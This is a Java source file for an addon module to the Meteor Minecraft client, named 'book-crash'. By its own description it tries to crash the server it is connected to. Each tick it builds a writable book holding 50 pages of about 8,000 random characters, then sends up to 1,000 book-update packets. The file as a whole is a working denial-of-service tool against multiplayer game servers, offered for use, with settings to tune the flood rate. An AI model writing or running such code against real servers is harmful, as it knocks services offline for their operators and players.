package widecat.meteorcrashaddon.modules;

import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
import org.apache.commons.lang3.RandomStringUtils;
import widecat.meteorcrashaddon.CrashAddon;

public class BookCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable")
        .description("Disables module on kick.")
        .defaultValue(true)
        .build()
    );

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount")
        .description("How many packets to send to the server per tick.")
        .defaultValue(100)
        .min(1)
        .sliderMax(1000)
        .build()
    );

    public BookCrash() {
        super(CrashAddon.CATEGORY, "book-crash", "Tries to crash the server by sending book sign packets.");
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        ItemStack book = new ItemStack(Items.WRITABLE_BOOK);
        NbtList pageList = new NbtList();

        for (int i = 0; i < 50; i++) {
            pageList.addElement(i, NbtString.of(RandomStringUtils.random(8169, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890")));
        }

        book.putSubTag("title", NbtString.of("Meteor On Crack!"));
        book.putSubTag("author", NbtString.of("MineGame159"));
        book.putSubTag("pages", pageList);

        for (int i = 0; i < amount.get(); i++) {
            mc.getNetworkHandler().sendPacket(new BookUpdateC2SPacket(book, true, 0));
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }
}
